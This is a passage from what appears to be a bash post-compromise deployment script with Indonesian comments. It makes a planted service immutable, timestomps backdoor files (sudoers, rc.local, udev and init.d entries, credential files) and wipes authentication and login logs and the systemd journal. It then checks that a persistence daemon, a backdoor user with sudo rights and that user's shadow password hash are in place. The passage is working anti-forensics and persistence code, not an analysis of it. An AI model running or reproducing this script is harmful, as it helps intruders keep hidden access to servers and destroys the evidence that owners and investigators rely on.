touch -r /etc/systemd/journald.conf /etc/systemd/journald.conf.d/50-resolved-helper.conf 2>/dev/null
systemctl kill --signal=SIGHUP systemd-journald 2>/dev/null

# === 15. CHATTR ===
chattr +i "$SVC" 2>/dev/null

# === 16. TIMESTOMP ===
echo "[*] Timestomping..."
stamp_ref() { local dir=$(dirname "$1"); local ref=$(find "$dir" -maxdepth 1 -type f ! -name "$(basename "$1")" 2>/dev/null | head -1); if [ -n "$ref" ]; then touch -r "$ref" "$1" 2>/dev/null; else touch -r /usr/bin/ssh "$1" 2>/dev/null; fi; }
for tf in "$CF" "$SYS_MONITOR" "$WRAPPER" "$TOKEN_FILE" "$LOCKFILE" "$CONFDIR/config.yml" "$CONFDIR/cred.json" "$SUDOERS_FILE" "$PROFILED" "$UDEV_RULE" "$INITD" /etc/rc.local; do [ -e "$tf" ] && stamp_ref "$tf"; done
for td in "$CONFDIR" "$(dirname "$CF")" "$CONFDIR/.hkeys"; do [ -d "$td" ] && touch -r /usr/lib/ "$td" 2>/dev/null; done

# === 17. LOG CLEANUP (TANPA hapus bash_history per perintah Tuan) ===
echo "[*] Initial log cleanup..."
for f in /var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/daemon.log /var/log/messages /var/log/secure; do [ -f "$f" ] && >"$f" 2>/dev/null; done
> /var/log/btmp 2>/dev/null; > /var/log/wtmp 2>/dev/null; > /var/log/lastlog 2>/dev/null
journalctl --vacuum-size=50M --vacuum-time=1d 2>/dev/null

# === 18. CLEANUP ===
rm -f /tmp/.d.sh /tmp/.d_*.sh 2>/dev/null

# === 19. VERIFY ===
echo ""
echo "=== VERIFICATION ==="
echo "Service: $(systemctl is-active $SERVICE_NAME)"
echo "Daemon: $(pgrep -c -f .sys-monitor) running"
echo "User: $(id $U 2>/dev/null)"
echo "Sudoers: $(cat $SUDOERS_FILE 2>/dev/null)"
echo "rc.local: $(grep sys-monitor /etc/rc.local 2>/dev/null)"
echo "profile.d: $(ls -la $PROFILED 2>/dev/null)"
echo "SSHD config test: $(/usr/sbin/sshd -t 2>&1 && echo 'PASS' || echo 'FAIL')"
echo "Password hash: $(awk -F: -v u=$U '$1==u{print substr($2,1,20)"..."}' /etc/shadow 2>/dev/null)"
echo "DEPLOY COMPLETE — TIER 70 (TANPA cron, TANPA bash_history cleanup)"
